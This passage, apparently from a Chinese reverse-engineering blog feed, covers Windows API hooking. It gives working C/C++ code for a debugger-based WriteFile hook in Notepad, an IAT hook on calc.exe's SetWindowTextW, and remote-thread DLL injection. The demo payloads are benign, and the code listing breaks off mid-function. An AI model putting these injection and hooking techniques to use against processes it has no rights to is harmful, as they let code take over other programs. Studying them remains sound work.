      &lt;p&gt;复习可执行文件的文件结构——PE。PE文件是微软Windows操作系统上的程序文件，意为可移植的可执行的文件。PE的段头直接沿用的COFF 的段头结构。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE——Hook</title>
    <link href="http://yoursite.com/2018/03/15/re_hook/"/>
    <id>http://yoursite.com/2018/03/15/re_hook/</id>
    <published>2018-03-15T11:54:22.442Z</published>
    <updated>2018-03-22T03:50:03.314Z</updated>
    
    <content type="html"><![CDATA[<p>逆向分析之”花”。windows的Hook是程序设计中最为灵活多变的技巧之一。Hook有两种含义:1、系统提供的消息Hook机制;2、自定义的Hook编程技巧，<br><a id="more"></a><br>Hook（钩子）是WINDOWS提供的一种消息处理机制平台，是指在程序正常运<br>行中接受信息之前预先启动的函数，用来检查和修改传给该程序的信息，（钩子）实<br>际上是一个处理消息的程序段，通过系统调用，把它挂入系统。每当特定的消息发出，<br>在没有到达目的窗口前，钩子程序就先捕获该消息，亦即钩子函数先得到控制权。</p><h1 id="钩取方式"><a href="#钩取方式" class="headerlink" title="钩取方式"></a>钩取方式</h1><p>如图，一般有三种API钩取方式：<br><img src="https://i.imgur.com/UaTkYDc.png" alt=""><br>下面都以Notepad.exe的WriteFile() API为例钩取</p><h1 id="方式1——动态-进程内存"><a href="#方式1——动态-进程内存" class="headerlink" title="方式1——动态-进程内存"></a>方式1——动态-进程内存</h1><p>直接在API加载时调用钩取<br>动态-进程内存-代码-调试技术<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"></div><div class="line">LPVOID g_pfWriteFile = <span class="literal">NULL</span>;  <span class="comment">//writefile函数的地址</span></div><div class="line">CREATE_PROCESS_DEBUG_INFO g_cpdi; <span class="comment">//存放调试信息</span></div><div class="line">BYTE g_chINT3 = <span class="number">0xCC</span>, g_chOrgByte = <span class="number">0</span>;<span class="comment">//0xCC是int 3的机器码</span></div><div class="line"></div><div class="line"><span class="comment">//当创建进程调试事件时运行此</span></div><div class="line"><span class="function">BOOL <span class="title">OnCreateProcessDebugEvent</span><span class="params">(LPDEBUG_EVENT pde)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">// WriteFile() API Address 获取地址</span></div><div class="line">g_pfWriteFile = GetProcAddress(GetModuleHandleA(<span class="string">"kernel32.dll"</span>), <span class="string">"WriteFile"</span>);</div><div class="line"></div><div class="line"><span class="comment">// API Hook - WriteFile()</span></div><div class="line"><span class="comment">//不知道？？？</span></div><div class="line"><span class="built_in">memcpy</span>(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, <span class="keyword">sizeof</span>(CREATE_PROCESS_DEBUG_INFO));</div><div class="line"><span class="comment">//这里读出 WriteFile()的首地址并备份在g_chOrgByte，后面脱钩会用到</span></div><div class="line">ReadProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chOrgByte, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</div><div class="line"><span class="comment">//将0xCC(INT 3) 写入WriteFile() API Address的第一个字节</span></div><div class="line">WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chINT3, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//当异常发生时，也就是 WriteFile()函数执行结束</span></div><div class="line"><span class="function">BOOL <span class="title">OnExceptionDebugEvent</span><span class="params">(LPDEBUG_EVENT pde)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">CONTEXT ctx;   <span class="comment">//记录hook的上下文</span></div><div class="line">PBYTE lpBuffer = <span class="literal">NULL</span>;<span class="comment">//用于临时缓冲区</span></div><div class="line">DWORD dwNumOfBytesToWrite, dwAddrOfBuffer, i;</div><div class="line">PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExceptionRecord;</div><div class="line"></div><div class="line"><span class="comment">// BreakPoint exception (INT 3) 当断点是3时，这样就一定会先执行OnCreateProcessDebugEvent</span></div><div class="line"><span class="keyword">if</span> (EXCEPTION_BREAKPOINT == per-&gt;ExceptionCode)</div><div class="line">&#123;</div><div class="line"><span class="comment">// BP Address == WriteFile() Address </span></div><div class="line"><span class="keyword">if</span> (g_pfWriteFile == per-&gt;ExceptionAddress)</div><div class="line">&#123;</div><div class="line"><span class="comment">// #1. Unhook 恢复 WriteFile()的首地址的值，也就是改为刚才备份g_chOrgByte</span></div><div class="line">WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chOrgByte, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="comment">// #2. Thread Context 获取线程的上下文</span></div><div class="line">ctx.ContextFlags = CONTEXT_CONTROL;</div><div class="line">GetThreadContext(g_cpdi.hThread, &amp;ctx);</div><div class="line"></div><div class="line"><span class="comment">// #3. WriteFile() 函数参数param 2, 3 的值</span></div><div class="line"><span class="comment">//   param 2 : ESP + 0x8 (这里是32位)</span></div><div class="line"><span class="comment">//   param 3 : ESP + 0xC</span></div><div class="line">ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="number">0x8</span>),&amp;dwAddrOfBuffer, <span class="keyword">sizeof</span>(DWORD), <span class="literal">NULL</span>);</div><div class="line">ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="number">0xC</span>),&amp;dwNumOfBytesToWrite, <span class="keyword">sizeof</span>(DWORD), <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="comment">// #4. 分配临时缓冲区</span></div><div class="line">lpBuffer = (PBYTE)<span class="built_in">malloc</span>(dwNumOfBytesToWrite + <span class="number">1</span>);</div><div class="line"><span class="built_in">memset</span>(lpBuffer, <span class="number">0</span>, dwNumOfBytesToWrite + <span class="number">1</span>);</div><div class="line"></div><div class="line"><span class="comment">// #5. WriteFile() 的输入 复制 缓冲区</span></div><div class="line">ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer,lpBuffer, dwNumOfBytesToWrite, <span class="literal">NULL</span>);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"\n### original string ###\n%s\n"</span>, lpBuffer);</div><div class="line"></div><div class="line"><span class="comment">// #6. 将小写转换成大写</span></div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dwNumOfBytesToWrite; i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (<span class="number">0x61</span> &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= <span class="number">0x7A</span>)</div><div class="line">lpBuffer[i] -= <span class="number">0x20</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">printf</span>(<span class="string">"\n### converted string ###\n%s\n"</span>, lpBuffer);</div><div class="line"></div><div class="line"><span class="comment">// #7. 将变换后缓冲区 的数据写入WriteFile()函数的缓冲区</span></div><div class="line">WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer,lpBuffer, dwNumOfBytesToWrite, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="comment">// #8. 释放缓冲区</span></div><div class="line"><span class="built_in">free</span>(lpBuffer);</div><div class="line"></div><div class="line"><span class="comment">// #9. 将上下文的EIP更改为 WriteFile()的首地址</span></div><div class="line">ctx.Eip = (DWORD)g_pfWriteFile;</div><div class="line">SetThreadContext(g_cpdi.hThread, &amp;ctx);</div><div class="line"></div><div class="line"><span class="comment">// #10. 运行被调试的进程</span></div><div class="line">ContinueDebugEvent(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE);</div><div class="line"></div><div class="line"><span class="comment">//释放当前的时间片，即放弃当前线程执行的CPU的时间片</span></div><div class="line">Sleep(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="comment">// #11. API Hook</span></div><div class="line">WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chINT3, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">DebugLoop</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">DEBUG_EVENT de;</div><div class="line">DWORD dwContinueStatus;</div><div class="line"></div><div class="line"><span class="comment">// Waiting Debuggee event 等待调试事件的发生 ，循环调试</span></div><div class="line"><span class="keyword">while</span> (WaitForDebugEvent(&amp;de, INFINITE))</div><div class="line">&#123;</div><div class="line">dwContinueStatus = DBG_CONTINUE;</div><div class="line"></div><div class="line"><span class="comment">// Debuggee  attach 属于SEH异常一种</span></div><div class="line"><span class="keyword">if</span> (CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode)</div><div class="line">&#123;</div><div class="line">OnCreateProcessDebugEvent(&amp;de);  <span class="comment">//跳到下一个函数</span></div><div class="line">&#125;</div><div class="line"><span class="comment">// 异常事件  属于SEH异常一种</span></div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode)</div><div class="line">&#123;</div><div class="line"><span class="comment">//跳到下一个函数</span></div><div class="line"><span class="keyword">if</span> (OnExceptionDebugEvent(&amp;de))</div><div class="line"><span class="keyword">continue</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// Debuggee exit,被调试事件终止  属于SEH异常一种</span></div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode)</div><div class="line">&#123;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Debuggee continue.再次调试事件</span></div><div class="line">ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueStatus);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">DWORD dwPID;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"\nUSAGE : hook.exe &lt;pid&gt;\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Attach Process 开始调试</span></div><div class="line">dwPID = atoi(argv[<span class="number">1</span>]);</div><div class="line"><span class="keyword">if</span> (!DebugActiveProcess(dwPID))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"DebugActiveProcess(%d) failed!!!\n"</span></div><div class="line"><span class="string">"Error Code = %d\n"</span>, dwPID, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//循环调试</span></div><div class="line">DebugLoop();  <span class="comment">//跳到下一个函数</span></div><div class="line"></div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>若在生成exe文件是出现这个错误“GetModuleHandleW”: 不能将参数 1 从“const char [10]”转换为“LPCWSTR” 解决方法:<br>项目菜单-&gt;属性-&gt;配置属性-&gt;常规-&gt;项目默认值-&gt;字符集改为未设置</p><p>生成hook.exe 额，在调试的时候，运行hook.exe pid后发现nopad卡住啦，尴尬,怀疑可能是要在32位的系统下，然后又在32位的系统下运行，发现并不是系统问题。又怀疑是不是编译的时候开啦ALSR啦，关掉ALSR，还是不行，得看看代码啦。原来是代码错啦，这。。。。</p><p>运行结果:<br><img src="https://i.imgur.com/AX5bTLh.png" alt=""><br>总结: 这是代码动态注入，通过附件进程，触发异常，通过异常获取WriteFile()函数的信息，在WriteFile()函数首地址下断点，然后截取控制流程，再次触发异常，恢复WriteFile()函数首地址，并且获取线程的上下文，然后将WriteFile()函数读取的缓冲区读出，然后转换成目标数据后写入WriteFile()函数的缓冲区，恢复线程上下文，继续运行就可以hook成功啦。 </p><h1 id="方式2——IAT钩取"><a href="#方式2——IAT钩取" class="headerlink" title="方式2——IAT钩取"></a>方式2——IAT钩取</h1><p>IAT的hook原理:在保持运行代码不变的前提下，将IAT中保存的API起始地址变为用户的起始地址。如图:<br>钩取前<br><img src="https://i.imgur.com/LCmH9DI.png" alt=""><br>钩取后<br><img src="https://i.imgur.com/2dd7nvJ.png" alt=""></p><p>下面以计算器为例，讲解IAT的dll的hook.<br>hookiat.dll的hookiat.cpp<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wchar.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(WINAPI *PFSETWINDOWTEXTW)</span><span class="params">(HWND hWnd, LPWSTR lpString)</span></span>;</div><div class="line">FARPROC g_pOrgFunc = <span class="literal">NULL</span>;</div><div class="line"><span class="function">BOOL WINAPI <span class="title">MySetWindowTextW</span><span class="params">(HWND hWnd, LPWSTR lpString)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">wchar_t</span>* pNum = <span class="string">L"零一二三四五六七八九"</span>;</div><div class="line">    <span class="keyword">wchar_t</span> temp[<span class="number">2</span>] = &#123;<span class="number">0</span>,&#125;;</div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, nLen = <span class="number">0</span>, nIndex = <span class="number">0</span>;</div><div class="line"></div><div class="line">    nLen = wcslen(lpString);</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nLen; i++)</div><div class="line">    &#123;</div><div class="line">        <span class="comment">// 将阿拉伯数字转化成中文</span></div><div class="line">        <span class="comment">//  lpString缓冲区 中文的字宽是的2字节</span></div><div class="line">        if( L'0' &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= L'9' )</div><div class="line">        &#123;</div><div class="line">            temp[<span class="number">0</span>] = lpString[i];</div><div class="line">            nIndex = _wtoi(temp);</div><div class="line">            lpString[i] = pNum[nIndex];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 调用user32!SetWindowTextW() API</span></div><div class="line">    <span class="comment">//  修改lpString缓冲区的数据</span></div><div class="line">    <span class="keyword">return</span> ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// hook_iat</span></div><div class="line"><span class="function">BOOL <span class="title">hook_iat</span><span class="params">(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">HMODULE hMod; <span class="comment">//hMod=ImageBase 基址</span></div><div class="line">LPCSTR szLibName; </div><div class="line">PIMAGE_IMPORT_DESCRIPTOR pImportDesc; </div><div class="line">PIMAGE_THUNK_DATA pThunk; </div><div class="line">DWORD dwOldProtect, dwRVA; </div><div class="line">PBYTE pAddr; </div><div class="line"></div><div class="line">hMod = GetModuleHandle(<span class="literal">NULL</span>); <span class="comment">//hMod= ImageBase of calc.exe 基址</span></div><div class="line">pAddr = (PBYTE)hMod;  </div><div class="line">pAddr += *((DWORD*)&amp;pAddr[<span class="number">0x3C</span>]); <span class="comment">// pAddr = VA to PE signature (IMAGE_NT_HEADERS)</span></div><div class="line">dwRVA = *((DWORD*)&amp;pAddr[<span class="number">0x80</span>]);  <span class="comment">// dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table</span></div><div class="line">pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA); <span class="comment">// pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table</span></div><div class="line"><span class="comment">//上面几行代码首先从ImageBase开始，经由PE签名找到IDT,plmportDesc中存储着IID(IMAGE_IMPORT_DESCRIPTOR)结构体的起始地址,IDT是由IID组成的数组，要找的IAT，先要查找到这个位置，而在本例中，pImportDesc=0x1012B80，可以用PEview看见。但是这里为什么是80？？？，而我们要找user32.dll,它在下面，所以遍历查找</span></div><div class="line"><span class="keyword">for</span>( ; pImportDesc-&gt;Name; pImportDesc++ )</div><div class="line">&#123;     </div><div class="line">szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name); <span class="comment">//获取user32.dll的库名</span></div><div class="line"><span class="keyword">if</span>( !_stricmp(szLibName, szDllName) )  <span class="comment">// 查找要的user32.dll</span></div><div class="line">&#123;</div><div class="line"><span class="comment">//得到user32.dll库的IAT地址 ，接着在IAT查找需要的函数user32!SetWindowTextW()</span></div><div class="line">pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + pImportDesc-&gt;FirstThunk);</div><div class="line"><span class="keyword">for</span>( ; pThunk-&gt;u1.Function; pThunk++ )</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>( pThunk-&gt;u1.Function == (DWORD)pfnOrg ) <span class="comment">//如果找到user32!SetWindowTextW()</span></div><div class="line">&#123;</div><div class="line">                  </div><div class="line">VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);       </div><div class="line">                    pThunk-&gt;u1.Function = (DWORD)pfnNew;</div><div class="line">                    VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, <span class="number">4</span>, dwOldProtect, &amp;dwOldProtect);</div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//dll主函数</span></div><div class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">switch</span>( fdwReason )</div><div class="line">&#123;</div><div class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH : </div><div class="line">            <span class="comment">//保存API原地址 </span></div><div class="line">           g_pOrgFunc = GetProcAddress(GetModuleHandle(<span class="string">L"user32.dll"</span>), <span class="string">"SetWindowTextW"</span>);</div><div class="line"></div><div class="line">            <span class="comment">// # hook 钩取</span></div><div class="line">            <span class="comment">//   hookiat!MySetWindowText()钩取user32!SetWindowTextW()</span></div><div class="line">hook_iat(<span class="string">"user32.dll"</span>, g_pOrgFunc, (PROC)MySetWindowTextW);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH :</div><div class="line">            <span class="comment">// # unhook 脱钩</span></div><div class="line">            <span class="comment">//   calc.exe 的IAT 恢复</span></div><div class="line">            hook_iat(<span class="string">"user32.dll"</span>, (PROC)MySetWindowTextW, g_pOrgFunc);</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>我们再看看hookd.exe的cpp<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tlhelp32.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"winbase.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tchar.h"</span></span></div><div class="line"></div><div class="line"><span class="comment">//使用方式</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"\nInjectDll.exe by ReverseCore\n"</span></div><div class="line"><span class="string">"- blog  : http://www.reversecore.com\n"</span></div><div class="line"><span class="string">"- email : reversecore@gmail.com\n\n"</span></div><div class="line"><span class="string">"- USAGE : hookdiat.exe &lt;i|e&gt; &lt;PID&gt; &lt;dll_path&gt;\n\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//钩取hook</span></div><div class="line"><span class="function">BOOL <span class="title">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllName)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">HANDLE hProcess, hThread;</div><div class="line">LPVOID pRemoteBuf;</div><div class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllName) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</div><div class="line">LPTHREAD_START_ROUTINE pThreadProc;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))</div><div class="line">&#123;</div><div class="line">DWORD dwErr = GetLastError();</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</div><div class="line"></div><div class="line">WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName, dwBufSize, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(<span class="string">L"kernel32.dll"</span>), <span class="string">"LoadLibraryW"</span>);</div><div class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</div><div class="line">WaitForSingleObject(hThread, INFINITE);</div><div class="line"></div><div class="line">CloseHandle(hThread);</div><div class="line">CloseHandle(hProcess);</div><div class="line"></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//脱钩</span></div><div class="line"><span class="function">BOOL <span 